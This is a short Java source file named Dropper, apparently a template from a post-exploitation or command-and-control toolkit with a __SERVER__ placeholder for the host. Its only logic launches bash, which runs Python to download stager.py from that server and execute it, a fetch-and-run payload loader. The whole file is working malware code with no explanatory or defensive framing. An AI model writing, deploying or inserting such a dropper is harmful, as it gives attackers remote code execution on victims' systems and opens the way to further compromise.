public class Dropper {
    static public void main (String[] args) {
        try {
            String[] cmds = {
                "/bin/bash", 
                "-c", 
                "python -c 'import urllib2; exec( compile( urllib2.urlopen( \"__SERVER__/stager.py\" ).read(), \"\", \"exec\" ) )'"
            };
            Process p = Runtime.getRuntime().exec (cmds);
            p.waitFor ();
        }
        catch (Exception e) {
            System.out.println ("Error: " + e.getMessage());
        }
    }
}
